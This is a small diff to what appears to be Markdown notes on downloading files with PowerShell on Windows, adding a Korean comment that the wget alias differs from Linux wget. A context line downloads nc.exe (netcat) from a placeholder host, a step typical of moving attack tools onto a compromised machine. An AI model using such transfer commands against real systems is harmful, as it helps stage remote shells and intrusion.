@@ -433,6 +433,7 @@ Invoke-WebRequest <target> -OutFile <Path>
 
 curl http://example.com/nc.exe -o nc.exe
 
+# linux의 wget과 다르다 !
 wget http://example.com/file.exe -OutFile file.exe
 ```
 
